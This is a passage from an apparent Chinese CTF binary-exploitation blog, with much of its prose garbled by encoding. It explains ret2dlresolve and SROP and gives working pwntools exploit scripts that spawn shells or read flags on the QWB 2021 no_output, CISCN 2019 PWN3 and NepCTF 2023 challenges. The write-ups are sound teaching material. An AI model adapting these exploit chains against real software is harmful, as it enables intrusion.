Relçš„å†…å­˜åœ°å€ã€‚ç„¶è€Œï¼Œå½“è¿™ä¸ªå†…å­˜åœ°å€è¶…å‡ºäº†.rel.pltæ®µï¼Œå¹¶æœ€ç»ˆè½åœ¨.bssæ®µä¸­æ—¶ï¼Œæ”»å‡»è€…å°±å¯ä»¥åœ¨é‚£é‡Œä¼ªé€ ä¸€ä¸ªElf_Rel,ä½¿r_offsetçš„å€¼æ˜¯ä¸€ä¸ªå¯å†™çš„å†…å­˜åœ°å€æ¥å°†è§£æåçš„å‡½æ•°åœ°å€å†™åœ¨é‚£é‡Œã€‚åŒç†ï¼Œä½¿rifoçš„å€¼æ˜¯ä¸€ä¸ªèƒ½å¤Ÿå°†åŠ¨æ€è£…è½½å™¨å¯¼å‘åˆ°æ”»å‡»è€…æ§åˆ¶å†…å­˜çš„ä¸‹æ ‡ï¼ŒæŒ‡å‘ä¸€ä¸ªä½äºå®ƒåé¢çš„Elf_Sym,è€ŒElf_Symä¸­çš„st_nameæŒ‡å‘å®ƒåé¢çš„å‡½æ•°åå­—ç¬¦ä¸²ã€‚\nç›´æ¥åœ¨é¢˜ä¸Šå¤ç°è¿‡ç¨‹[å¼ºç½‘æ¯2021 no_output]checksecåœ¨ç¨‹åºè¿è¡Œå‰ï¼ˆæ‰§è¡Œç¬¬ä¸€æ¬¡readå‰ï¼‰ æ–­ç‚¹ä¸‹åˆ°çš„ä½ç½®å°±æ˜¯read@plt,é¡ºå¸¦å¯ä»¥çœ‹åˆ°dl_runtime_resolveçš„å…¥å£æ¥ä¸‹æ¥èµ°é€†å‘éƒ¨åˆ†è¿™é‡Œæ‰“å¼€äº†flagï¼ŒåŒæ—¶å°†unk_804C080å­˜åœ¨å…¨å±€å˜é‡resultã€‚\nv3 = &quot;tell me some thing&quot;;read(0, buf, 0x30u);v3 = &quot;Tell me your name:\\n&quot;;read(0, src, 0x20u);  sub_80493EC(src);  strcpy(dest, src);  // strcpy è¢« &#x27;\\x00&#x27; æˆªæ–­ï¼Œè€Œä¸”è¿˜ä¼šå¾€ dest åé¢è¡¥ä¸€ä¸ª &#x27;\\x00&#x27;v3 = &quot;now give you the flag\\n&quot;;read(unk_804C080, src, 0x10u);// off_804C034 å­˜æ”¾çš„æ˜¯å­—ç¬¦ä¸² &quot;hello_boy\\x00&quot;// check() æ˜¯å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸åŒè¿”å› 0result = check(src, off_804C034); if ( !result )  result = sub_8049269();\nè¿™é‡Œçš„strcpyå­˜åœ¨ä¸€ä¸ªç±»ä¼¼äºoff-by-nullçš„æ¼æ´ï¼Œä¼šæŠŠunk_804C080è¦†ç›–ä¸º\\x00,å› ä¸ºdeståé¢å°±æ˜¯unk_804C080ï¼Œå¦‚ä¸‹ï¼šå¯¼è‡´åä¸€ä¸ªreadå®é™…æ‰§è¡Œread(unk_804C080,src,0x10),å› æ­¤å¯ä»¥é€šè¿‡ç›´æ¥è¾“å…¥â€hello_boy\\x00â€æ¥è¿›å…¥sub_8049269ï¼Œå¦‚ä¸‹æ­¤å¤„ signal() å‡½æ•°çš„ä½œç”¨åœ¨äºï¼šå½“å‘ç”Ÿé™¤æ³•å¼‚å¸¸æ—¶ï¼Œæ‰§è¡Œ sub_8049236 å‡½æ•°ï¼Œsub_8049236 å‡½æ•°ä¸­ä¾¿æ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºäº†ã€‚ç”±äº v1 ä¸èƒ½ä¸º 0ï¼Œæˆ‘ä»¬ä»¤ v2 &#x3D; -2147483648, v1 &#x3D; -1ï¼Œæ­¤æ—¶ä¼šå‘ç”Ÿé™¤æ³•æº¢å‡ºï¼ˆint ç±»å‹çš„æ•°æ®èŒƒå›´ä¸ºï¼š-2147483648 ~ 2147483647ï¼‰ã€‚ç”±äºæ²¡æœ‰è¾“å‡ºå‡½æ•°ï¼Œç”¨ ret2dlresolve çš„æ–¹å¼æ¥åˆ©ç”¨è¿™ä¸ªæ ˆæº¢å‡ºæ¼æ´ã€‚å­˜ä¸¤ä¸ªæ¨¡æ¿å§ezdl\nfrom pwn import *context.log_level = &quot;debug&quot;elf = ELF(&#x27;./no_output&#x27;)p = process(&#x27;./no_output&#x27;)rop = ROP(&#x27;./no_output&#x27;)# è¿™é‡Œå¾ˆå¥‡æ€ªï¼Œå¥½åƒæ”¾åˆ«çš„å­—ç¬¦ä¸²éƒ½ä¸è¡Œ...p.send(b&#x27;\\x00&#x27;)#gdb.attach(p)p.send(b&#x27;a&#x27;*0x20)p.send(b&#x27;hello_boy\\x00&#x27;)p.sendline(b&#x27;-2147483648&#x27;)p.sendline(b&#x27;-1&#x27;)dlresolve = Ret2dlresolvePayload(elf, symbol=&quot;system&quot;, args=[&quot;/bin/sh&quot;])print(dlresolve)rop.read(0, dlresolve.data_addr)rop.ret2dlresolve(dlresolve)raw_rop = rop.chain()info(rop.dump())# fit() å‡½æ•°ä¼šè‡ªåŠ¨å¡«å……ï¼Œ76 æ˜¯æº¢å‡ºç‚¹ï¼Œ0x100 æ˜¯ read() å‡½æ•°çš„é•¿åº¦p.sendline(fit(&#123;76:raw_rop, 0x100:dlresolve.payload&#125;))p.interactive()\ndetail\nfrom pwn import *from pwn import p32challenge = &quot;./no_output&quot;context(arch = &quot;i386&quot;,log_level = &quot;debug&quot;,os = &quot;linux&quot;)p = process(&#x27;./no_output&#x27;)#libc = ELF(&quot;./libc.so.6&quot;)#r = remote(&quot;39.105.138.97&quot;,1234)elf = ELF(&#x27;./no_output&#x27;)leave_ret = 0x080491a5bss_stage = elf.bss() + 0x200success(&quot;bss : %s&quot;,hex(elf.bss()))fake_ebp = bss_stageoffset = 0x4c-8+8#read_plt  = elf.plt[&quot;read&quot;]#gdb.attach(r)p1 = b&quot;\\x00&quot; * 0x30p.send(p1)sleep(1)p.send(b&#x27;A&#x27; * 0x20)str1 = b&#x27;hello_boy&#x27;str1 = str1.ljust(0x10,b&#x27;\\x00&#x27;)p.send(str1)p.sendline(b&quot;-2147483648&quot;)p.sendline(b&quot;-1&quot;)sleep(0.1)read_plt = 0x80490C4ppp_ret = 0x08049581 # ROPgadget --binary test --only &quot;pop|ret&quot;pop_ebp_ret = 0x08049583leave_ret = 0x080491a5 # ROPgadget --binary test --only &quot;leave|ret&quot;stack_size = 0x800bss_addr = elf.bss() # readelf -S test | grep &quot;.bss&quot;base_stage = bss_addr + stack_sizepayload = flat(b&#x27;A&#x27; * offset, p32(read_plt), p32(ppp_ret), p32(0), p32(base_stage), p32(100), p32(pop_ebp_ret), p32(base_stage), p32(leave_ret))p.send(payload)cmd = &quot;/bin/sh&quot;plt_0 = 0x8049030 # objdump -d -j .plt testrel_plt = 0x8048414 # objdump -s -j .rel.plt testdynsym = 0x08048248  # readelf -S teststrtab = 0x08048318 #readelf -S testfake_write_addr = base_stage + 28fake_arg = fake_write_addr - rel_pltr_offset = elf.got[&#x27;read&#x27;]align = 0x10 - ((base_stage + 36 - dynsym) % 16) fake_sym_addr = base_stage + 36 + align # å¡«å……åœ°å€ä½¿å…¶ä¸dynsymçš„åç§»16å­—èŠ‚å¯¹é½ï¼ˆå³ä¸¤è€…çš„å·®å€¼èƒ½è¢«16æ•´é™¤ï¼‰ï¼Œå› ä¸ºç»“æ„ä½“symçš„å¤§å°éƒ½æ˜¯16å­—èŠ‚r_info = ((((fake_sym_addr - dynsym)//16) &lt;&lt; 8) | 0x7) # ä½¿å…¶æœ€ä½ä½ä¸º7ï¼Œé€šè¿‡æ£€æµ‹fake_write_rel = flat(p32(r_offset), p32(r_info))fake_write_str_addr = base_stage + 36 + align + 0x10fake_name = fake_write_str_addr - strtabfake_sym = flat(p32(fake_name),p32(0),p32(0),p32(0x12))fake_write_str = &#x27;system\\x00&#x27;payload2 = flat(b&#x27;AAAA&#x27;, p32(plt_0), fake_arg, p32(ppp_ret), p32(base_stage + 80), p32(base_stage + 80), p32(len(cmd)), fake_write_rel # base_stage + 28, b&#x27;A&#x27; * align # ç”¨äºå¯¹é½çš„å¡«å……, fake_sym # base_stage + 36 + align, fake_write_str # ä¼ªé€ å‡ºçš„å­—ç¬¦ä¸²)payload2 += flat(&#x27;A&#x27; * (80-len(payload2)) , cmd + &#x27;\\x00&#x27;)payload2 += flat(&#x27;A&#x27; * (100-len(payload2)))#pause()p.send(payload2)p.interactive()\n","categories":["stack"],"tags":["rop"]},{"title":"åˆæ¢srop","url":"/2023/08/13/srop/","content":"signal æœºåˆ¶signal æœºåˆ¶æ˜¯ç±» unix ç³»ç»Ÿä¸­è¿›ç¨‹ä¹‹é—´ç›¸äº’ä¼ é€’ä¿¡æ¯çš„ä¸€ç§æ–¹æ³•ã€‚ä¸€èˆ¬ï¼Œæˆ‘ä»¬ä¹Ÿç§°å…¶ä¸ºè½¯ä¸­æ–­ä¿¡å·ï¼Œæˆ–è€…è½¯ä¸­æ–­ã€‚æ¯”å¦‚è¯´ï¼Œè¿›ç¨‹ä¹‹é—´å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨ kill æ¥å‘é€è½¯ä¸­æ–­ä¿¡å·ã€‚\nâ”Œâ”€â”€(str1d3rã‰¿str1k3Gwindows)-[~]â””â”€$ kill -l 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR111) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM16) SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ26) SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR31) SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+338) SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+843) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+1348) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-1253) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-758) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-263) SIGRTMAX-1  64) SIGRTMAX\nå†…æ ¸å‘æŸä¸ªè¿›ç¨‹å‘é€ signal æœºåˆ¶ï¼Œè¯¥è¿›ç¨‹ä¼šè¢«æš‚æ—¶æŒ‚èµ·ï¼Œè¿›å…¥å†…æ ¸æ€ã€‚\nå†…æ ¸ä¼šä¸ºè¯¥è¿›ç¨‹ä¿å­˜ç›¸åº”çš„ä¸Šä¸‹æ–‡ï¼Œä¸»è¦æ˜¯å°†æ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆä¸­ï¼Œä»¥åŠå‹å…¥ signal ä¿¡æ¯ï¼Œä»¥åŠæŒ‡å‘ sigreturn çš„ç³»ç»Ÿè°ƒç”¨åœ°å€ã€‚æ­¤æ—¶æ ˆçš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ç§° ucontext ä»¥åŠ siginfo è¿™ä¸€æ®µä¸º Signal Frameã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯åœ¨ç”¨æˆ·è¿›ç¨‹çš„åœ°å€ç©ºé—´çš„ã€‚ä¹‹åä¼šè·³è½¬åˆ°æ³¨å†Œè¿‡çš„ signal handler ä¸­å¤„ç†ç›¸åº”çš„ signalã€‚å› æ­¤ï¼Œå½“ signal handler æ‰§è¡Œå®Œä¹‹åï¼Œå°±ä¼šæ‰§è¡Œ sigreturn ä»£ç ã€‚å¯¹äº signal Frame æ¥è¯´ï¼Œä¼šå› ä¸ºæ¶æ„çš„ä¸åŒè€Œæœ‰æ‰€åŒºåˆ«ï¼Œè¿™é‡Œç»™å‡ºåˆ†åˆ«ç»™å‡º x86 ä»¥åŠ x64 çš„ sigcontextx86\nstruct sigcontext&#123;  unsigned short gs, __gsh;  unsigned short fs, __fsh;  unsigned short es, __esh;  unsigned short ds, __dsh;  unsigned long edi;  unsigned long esi;  unsigned long ebp;  unsigned long esp;  unsigned long ebx;  unsigned long edx;  unsigned long ecx;  unsigned long eax;  unsigned long trapno;  unsigned long err;  unsigned long eip;  unsigned short cs, __csh;  unsigned long eflags;  unsigned long esp_at_signal;  unsigned short ss, __ssh;  struct _fpstate * fpstate;  unsigned long oldmask;  unsigned long cr2;&#125;;\nx64\nstruct _fpstate&#123;  /* FPU environment matching the 64-bit FXSAVE layout.  */  __uint16_t        cwd;  __uint16_t        swd;  __uint16_t        ftw;  __uint16_t        fop;  __uint64_t        rip;  __uint64_t        rdp;  __uint32_t        mxcsr;  __uint32_t        mxcr_mask;  struct _fpxreg    _st[8];  struct _xmmreg    _xmm[16];  __uint32_t        padding[24];&#125;;struct sigcontext&#123;  __uint64_t r8;  __uint64_t r9;  __uint64_t r10;  __uint64_t r11;  __uint64_t r12;  __uint64_t r13;  __uint64_t r14;  __uint64_t r15;  __uint64_t rdi;  __uint64_t rsi;  __uint64_t rbp;  __uint64_t rbx;  __uint64_t rdx;  __uint64_t rax;  __uint64_t rcx;  __uint64_t rsp;  __uint64_t rip;  __uint64_t eflags;  unsigned short cs;  unsigned short gs;  unsigned short fs;  unsigned short __pad0;  __uint64_t err;  __uint64_t trapno;  __uint64_t oldmask;  __uint64_t cr2;  __extension__ union    &#123;      struct _fpstate * fpstate;      __uint64_t __fpstate_word;    &#125;;  __uint64_t __reserved1 [8];&#125;;\nsignal handler è¿”å›åï¼Œå†…æ ¸ä¸ºæ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨ï¼Œä¸ºè¯¥è¿›ç¨‹æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…æ‹¬å°†æ‰€æœ‰å‹å…¥çš„å¯„å­˜å™¨ï¼Œé‡æ–° pop å›å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œã€‚å…¶ä¸­ï¼Œ32 ä½çš„ sigreturn çš„è°ƒç”¨å·ä¸º 119(0x77)ï¼Œ64 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15(0xf)ã€‚\nä»”ç»†å›é¡¾ä¸€ä¸‹å†…æ ¸åœ¨ signal ä¿¡å·å¤„ç†çš„è¿‡ç¨‹ä¸­çš„å·¥ä½œï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå†…æ ¸ä¸»è¦åšçš„å·¥ä½œå°±æ˜¯ä¸ºè¿›ç¨‹ä¿å­˜ä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”æ¢å¤ä¸Šä¸‹æ–‡ã€‚è¿™ä¸ªä¸»è¦çš„å˜åŠ¨éƒ½åœ¨ Signal Frame ä¸­ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼š\nSignal Frame è¢«ä¿å­˜åœ¨ç”¨æˆ·çš„åœ°å€ç©ºé—´ä¸­ï¼Œæ‰€ä»¥ç”¨æˆ·æ˜¯å¯ä»¥è¯»å†™çš„ã€‚ç”±äºå†…æ ¸ä¸ä¿¡å·å¤„ç†ç¨‹åºæ— å…³ (kernel agnostic about signal handlers)ï¼Œå®ƒå¹¶ä¸ä¼šå»è®°å½•è¿™ä¸ª signal å¯¹åº”çš„ Signal Frameï¼Œæ‰€ä»¥å½“æ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œæ­¤æ—¶çš„ Signal Frame å¹¶ä¸ä¸€å®šæ˜¯ä¹‹å‰å†…æ ¸ä¸ºç”¨æˆ·è¿›ç¨‹ä¿å­˜çš„ Signal Frameã€‚è¯´åˆ°è¿™é‡Œï¼Œå…¶å®ï¼ŒSROP çš„åŸºæœ¬åˆ©ç”¨åŸç†ä¹Ÿå°±å‡ºç°äº†ã€‚è·å– shellé¦–å…ˆï¼Œæˆ‘ä»¬å‡è®¾æ”»å‡»è€…å¯ä»¥æ§åˆ¶ç”¨æˆ·è¿›ç¨‹çš„æ ˆï¼Œé‚£ä¹ˆå®ƒå°±å¯ä»¥ä¼ªé€ ä¸€ä¸ª Signal Frameï¼Œå½“ç³»ç»Ÿæ‰§è¡Œå®Œ sigreturn ç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œä¼šæ‰§è¡Œä¸€ç³»åˆ—çš„ pop æŒ‡ä»¤ä»¥ä¾¿äºæ¢å¤ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œå½“æ‰§è¡Œåˆ° rip æ—¶ï¼Œå°±ä¼šå°†ç¨‹åºæ‰§è¡ŒæµæŒ‡å‘ syscall åœ°å€ï¼Œæ ¹æ®ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œæ­¤æ—¶ï¼Œä¾¿ä¼šå¾—åˆ°ä¸€ä¸ª shellã€‚system call chainséœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼Œä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åªæ˜¯å•ç‹¬çš„è·å¾—ä¸€ä¸ª shellã€‚æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå¸Œæœ›æ‰§è¡Œä¸€ç³»åˆ—çš„å‡½æ•°ã€‚æˆ‘ä»¬åªéœ€è¦åšä¸¤å¤„ä¿®æ”¹å³å¯æ§åˆ¶æ ˆæŒ‡é’ˆã€‚æŠŠåŸæ¥ rip æŒ‡å‘çš„syscall gadget æ¢æˆsyscall; ret gadgetã€‚è¿™æ ·å½“æ¯æ¬¡ syscall è¿”å›çš„æ—¶å€™ï¼Œæ ˆæŒ‡é’ˆéƒ½ä¼šæŒ‡å‘ä¸‹ä¸€ä¸ª Signal Frameã€‚å› æ­¤å°±å¯ä»¥æ‰§è¡Œä¸€ç³»åˆ—çš„ sigreturn å‡½æ•°è°ƒç”¨ã€‚åç»­ Â¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨æ„é€  ROP æ”»å‡»çš„æ—¶å€™ï¼Œéœ€è¦æ»¡è¶³ä¸‹é¢çš„æ¡ä»¶å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ¥æ§åˆ¶æ ˆçš„å†…å®¹éœ€è¦çŸ¥é“ç›¸åº”çš„åœ°å€â€œ&#x2F;bin&#x2F;shâ€Signal Framesyscallsigreturnéœ€è¦æœ‰å¤Ÿå¤§çš„ç©ºé—´æ¥å¡ä¸‹æ•´ä¸ª sigal frame\nä»¥ä¸Šä»‹ç»æ¥è‡ªCTFwikipwntoolså·²é›†æˆsropæ”»å‡»\n[CISCN 2019åå—]PWN3 #å¤ç°ç¯å¢ƒubuntu 20.04\nstr1k3@ubuntu:~/Desktop$ checksec &#x27;/var/run/vmblock-fuse/blockdir/P0SsCP/pwn3&#x27; [*] &#x27;/var/run/vmblock-fuse/blockdir/P0SsCP/pwn3&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\nä¿æŠ¤æ²¡ç‰¹åˆ«çš„\nsigned __int64 vuln()&#123;  signed __int64 v0; // rax  char buf[16]; // [rsp+0h] [rbp-10h] BYREF  v0 = sys_read(0, buf, 0x400uLL);  return sys_write(1u, buf, 0x30uLL); //æ‰“å°å‡ºæ ˆåœ°å€&#125;\nç»™äº†gadget\n.text:00000000004004D6                               public gadgets.text:00000000004004D6                               gadgets proc near.text:00000000004004D6                               ; __unwind &#123;.text:00000000004004D6 55                            push    rbp.text:00000000004004D7 48 89 E5                      mov     rbp, rsp.text:00000000004004DA 48 C7 C0 0F 00 00 00          mov     rax, 0Fh.text:00000000004004E1 C3                            retn.text:00000000004004E1.text:00000000004004E1                               gadgets endp ; sp-analysis failed.text:00000000004004E1.text:00000000004004E2                               ; ---------------------------------------------------------------------------.text:00000000004004E2 48 C7 C0 3B 00 00 00          mov     rax, 3Bh ; &#x27;;&#x27;.text:00000000004004E9 C3                            retn.text:00000000004004E9.text:00000000004004E9                               ; ---------------------------------------------------------------------------.text:00000000004004EA 90                            db 90h.text:00000000004004EB                               ; ---------------------------------------------------------------------------.text:00000000004004EB 5D                            pop     rbp.text:00000000004004EC C3                            retn.text:00000000004004EC                               ; &#125; // starts at 4004D6\næœ‰mov raxï¼Œ0xf,æ˜¾ç„¶è¿›è¡Œsropè¦å®ç°system(â€œ&#x2F;bin&#x2F;shâ€)é¦–å…ˆæˆ‘ä»¬è¿˜éœ€è¦ç»™rdièµ‹å€¼bin_shå­—ç¬¦ä¸²çš„åœ°å€éœ€è¦æŠŠbin_shå†™åˆ°æ ˆä¸Š ç„¶ååˆ©ç”¨writeå‡½æ•°æ³„éœ²æ ˆåœ°å€\npwndbg&gt; x/40gx 0x7fffffffe3300x7fffffffe330:\t0x6161616161616161*\t0x000000000040050a 0x7fffffffe340:\t0x00007fffffffe360\t0x00000000004005360x7fffffffe350:\t0x00007fffffffe458*\t0x0000000100000000 0x7fffffffe360:\t0x0000000000000000\t0x00007ffff7de80830x7fffffffe370:\t0x00007ffff7ffc620\t0x00007fffffffe4580x7fffffffe380:\t0x0000000100000000\t0x000000000040051d0x7fffffffe390:\t0x0000000000400540\t0xb0a1866950c4d5040x7fffffffe3a0:\t0x00000000004003e0\t0x00007fffffffe4500x7fffffffe3b0:\t0x0000000000000000\t0x00000000000000000x7fffffffe3c0:\t0x4f5e79969624d504\t0x4f5e69d450aad5040x7fffffffe3d0:\t0x0000000000000000\t0x00000000000000000x7fffffffe3e0:\t0x0000000000000000\t0x00000000000000010x7fffffffe3f0:\t0x00007fffffffe458\t0x00007fffffffe4680x7fffffffe400:\t0x00007ffff7ffe190\t0x00000000000000000x7fffffffe410:\t0x0000000000000000\t0x00000000004003e00x7fffffffe420:\t0x00007fffffffe450\t0x00000000000000000x7fffffffe430:\t0x0000000000000000\t0x00000000004004090x7fffffffe440:\t0x00007fffffffe448\t0x000000000000001c0x7fffffffe450:\t0x0000000000000001\t0x00007fffffffe6d40x7fffffffe460:\t0x0000000000000000\t0x00007fffffffe709\nè¾“å…¥çš„8å­—èŠ‚çš„å­—æ¯aä½äº0x7fffffffe330,0x7fffffffe350å¤„æœ‰ä¸€ä¸ª0x00007fffffffe458çš„åœ°å€å¯ä»¥æ³„éœ²\nfrom pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)#p = process(&quot;./pwn3&quot;)p = remote(&quot;node1.anna.nssctf.cn&quot;,28856)elf = ELF(&quot;./pwn3&quot;)syscall = 0x400501syscall_ret = 0x400517gadget = 0x4004DAvuln = 0x4004ED#æ³„éœ²æ ˆåœ°å€p.send(b&#x27;a&#x27;*0x10+p64(vuln))p.recv(0x20)stack = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;)) -0x118print(&quot;stack -&gt; &quot; + hex(stack))#sropframe = SigreturnFrame()frame.rax = 59frame.rdi = stackframe.rip = syscallframe.rsi = 0payload = b&quot;/bin/sh\\x00&quot;*0x2 + p64(gadget) + p64(syscall) + bytes(frame)p.send(payload)p.interactive()\n\n[NepCTF 2023] srop[NepCTF2023]sropç»™äº†æºç   \n//gcc -no-pie pwn.c -fno-stack-protector -z now -o pwn  -lseccomp#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;syscall.h&gt;#include &lt;seccomp.h&gt;#include &lt;linux/seccomp.h&gt;char buf[0x30]=&quot;welcome to NepCTF2023!\\n&quot;;int seccomp()&#123;    scmp_filter_ctx ctx;    ctx = seccomp_init(SCMP_ACT_KILL);    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), 0);    seccomp_load(ctx);    return 0;&#125;//æ²™ç›’int sys()&#123;    return 15;&#125;//syscallint main()&#123;     char bd[0x30];     seccomp();     syscall(1,1,buf,0x30); //write(&quot;welcome to NepCTF2023!\\n&quot;)     return syscall(0,0,bd,0x300);  //read(bd,0x300)&#125;//ä¸»å‡½æ•°\næŸ¥ä¿æŠ¤\npwndbg&gt; checksec[*] &#x27;/home/str1k3/Desktop/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\nstr1k3@ubuntu:~/Desktop$ seccomp-tools dump ./pwn line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009 0008: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x06 0x00 0x00 0x00000000  return KILL\næ²™ç›’ï¼Œä½†æ˜¯å…è®¸äº†orw\npwndbg&gt; search flagSearching for value: &#x27;flag&#x27;libc-2.27.so    0x7ffff77d4a3b insb byte ptr [rdi], dx /* &#x27;flags&#x27; */libc-2.27.so    0x7ffff77d7505 insb byte ptr [rdi], dx /* &#x27;flags&#x27; */libc-2.27.so    0x7ffff77d7906 insb byte ptr [rdi], dx /* &#x27;flags&#x27; */libc-2.27.so    0x7ffff79736a0 insb byte ptr [rdi], dx /* &#x27;flags&#x27; */libc-2.27.so    0x7ffff7979b44 insb byte ptr [rdi], dx /* &#x27;flags2 &amp; _IO_FLAGS2_FORTIFY&#x27; */libc-2.27.so    0x7ffff79b0282 &#x27;flags is not implemented and will always fail&#x27;warning: Unable to access 16003 bytes of target memory at 0x7ffff79b0286, halting search.warning: Unable to access 16003 bytes of target memory at 0x7ffff7bd1000, halting search.ld-2.27.so      0x7ffff7df6421 insb byte ptr [rdi], dx /* &#x27;flag)&#x27; */ld-2.27.so      0x7ffff7df6efe insb byte ptr [rdi], dx /* &#x27;flag value(s) of 0x%x in DT_FLAGS_1.\\n&#x27; */ld-2.27.so      0x7ffff7df77d4 insb byte ptr [rdi], dx /* &#x27;flags &amp; ~(DL_LOOKUP_ADD_DEPENDENCY | DL_LOOKUP_GSCOPE_LOCK)) == 0&#x27; */ld-2.27.so      0x7ffff7df844e insb byte ptr [rdi], dx /* &#x27;flags_1 &amp; DF_1_NODELETE) == 0&#x27; */\n\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)# io = process(&quot;./pwn&quot;)p = remote(&quot;nepctf.1cepeak.cn&quot;, 31943)mov_eax_15 = 0x0000400754   #0x0000000000400754 : mov eax, 0xf ; pop rbp ; retbuf = 0x00000601050         #.bss:0000000000601050ret = 0x004007AE            #.text:00000000004007AD C9                            leave                            #.text:00000000004007AE C3                            retnsyscall = 0x0004005B0       #.plt:00000000004005B0                               ; [00000006 BYTES: COLLAPSED FUNCTION _syscall. PRESS CTRL-NUMPAD+ TO EXPAND]pop_rdi = 0x0000000000400813    #0x0000000000400813 : pop rdi ; retstack = 0x0601a50#å¼€å‡ºä¸€ä¸ªæ ˆframe = SigreturnFrame()frame.rdi = 0frame.rsi = 0frame.rdx = stack-0x8frame.rcx = 0x1000frame.rip = syscallframe.rsp = stackpayload = b&quot;a&quot; * (0x0030+8) + flat([    pop_rdi,    15,    syscall]) + bytes(frame)p.send(payload)sleep(1)#orwframe = SigreturnFrame()frame.rdi = 2frame.rsi = stack-0x8frame.rdx = 0frame.rcx = 0x1000frame.rip = syscallframe.rsp = stack + 0x110payload = b&quot;./flag\\x00\\x00&quot; + flat([    pop_rdi,    15,    syscall ]) + bytes(frame) frame = SigreturnFrame()frame.rdi = 0frame.rsi = 3frame.rdx = stack-0x100frame.rcx = 0x40frame.rip = syscallframe.rsp = stack + 0x110 + 0x110payload += flat([    pop_rdi,    15,    syscall ]) + bytes(frame) frame = SigreturnFrame()frame.rdi = 1frame.rsi = 1frame.rdx = stack-0x100frame.rcx = 0x40frame.rip = syscallframe.rsp = stack + 0x110 + 0x110 + 0x110payload += flat([    pop_rdi,    15,    syscall ]) + bytes(frame) log.success(f&quot;length &#123;len(payload):#x&#125;&quot;)p.send(payload)p.interactive()","categories":["stack"],"tags":["rop"]},{"title":"setcontext","url":"/2023/09/28/setcontext/","content":"åŸºäºå †çš„orwç”±äºæ²™ç®±æœºåˆ¶çš„å­˜åœ¨ï¼Œä¸èƒ½ä½¿ç”¨onegadgetæˆ–è€…systemã€‚æ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ROPé“¾çš„æ–¹å¼æ„é€ 